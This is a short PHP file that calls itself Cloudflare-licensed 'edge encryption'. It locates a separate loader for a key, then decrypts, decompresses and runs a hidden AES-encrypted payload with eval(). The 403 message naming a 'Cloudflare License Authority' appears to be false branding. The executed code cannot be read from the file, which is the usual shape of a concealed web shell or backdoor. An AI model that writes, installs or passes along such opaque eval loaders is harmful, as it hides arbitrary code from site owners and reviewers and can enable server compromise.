<?php
/* PROTECTED BY TALISMAN CLOUDFLARE EDGE ENCRYPTION v3.0 */
if(!function_exists('_talisman_runtime_key')){
  $l21c77=__DIR__;
  while($l21c77&&!file_exists($l21c77.'/talisman_loader.php')){
    $p=dirname($l21c77);if($p===$l21c77)break;$l21c77=$p;
  }
  if(file_exists($l21c77.'/talisman_loader.php')){require_once $l21c77.'/talisman_loader.php';}
}
$k77fd6=function_exists('_talisman_runtime_key')?_talisman_runtime_key():false;
if($k77fd6===false){header('HTTP/1.1 403 Forbidden');die('403 Security Error: Execution Locked by Cloudflare License Authority.');}
$p3588b=base64_decode('AejrGAoN9z7yEnaAT75uczRWNktWY1RtWEZXNktkN1VHK2ZJT0l5MVU4Yk54ZnduUVNPWnlFelVzVzlzVk5qWlRTcHRXdWhaSnRZem1CSndDYmYxY0J6LzB1NVlBUHpYeWlnUG1PZHhpbXNWRUI0Yk5ORGphSWZlZ3dvUnBtcSt6b2dqU0FUcHFibTJwVWFUYzJpM1oyNFNNUUJMelhodEdOaTFEQlR3b0ErdTFzNGFFR25rU3AyTCtiRit0MFRGMWNZMHNVUkZmYnE0RGFOdlB1Z25nWkRQeHZOSzJSREZHdGduOGdqTUM5b2t3QkpVYi9uRlRUSGU5RC84aWpHVzFDaCtLalFZUjNHYkdrdTFrYjBIZ294dVRuUTNjb2UwRkQ0K1hMd2tVMW1hQWhIV09yM05oQmlHMngvU1R3aUwxUzBPeFUrSmgxb2tLNkNQamNKOUZDcVhRQTlhVmE5dnpuZUlQZU5yOW1JVVB0YUdlVzNYWWhRWDNsV2hKUEx1azlOMldWc1R0d1UraEE5L2NCaEM1bC9mY3pGaFhLT0M0d2lJVmJ4dkpkd3hoVmtNYTVhQWV6VWZFRjJ3Y2FmUGp2QS9VZUJSQVJKRnJMb3VDT1U0aU1tVHl3MG5qTFZmM1h5Y2JuUzA5UWdFSEkrUEJQTmtJNUVXZzFnNUlFTTFrL0VkTHlKcHB2LzJDWHN2bDQzVmh3TGNSUjQ2ZmFQdktUTWlhVHRxRnd5OTJyMWFhR3NBMDF2SnRWZFBENzhkRnVGN3dZOGF5Z213ZlZDV3Q5aExpTFcvOVFWMkJRL1JoejdHSU1lSUZJQkRrY0J2REpBc0RhVWNMYXVuTXVTZnduaE1DSysvRVpMUWpEV3ppRWkvL0RSa3JoNmFkUFpkcGRUMy8raTVZODFLMGFsOW1Xd0ZqeEh4RXBydTFTbFYvZC9ibDhnWGJMQzdxdk9mY21lbTRwQ2laNnhYOGVFRHdCWk1nR2wwbWVtb1R6UlIrWi9McHhDczdZUT0=');
$ib2927=openssl_cipher_iv_length('aes-256-cbc');
$vb832b=substr($p3588b,0,$ib2927);
$c83d63=substr($p3588b,$ib2927);
eval('?>'.gzinflate(openssl_decrypt($c83d63,'aes-256-cbc',$k77fd6,0,$vb832b)));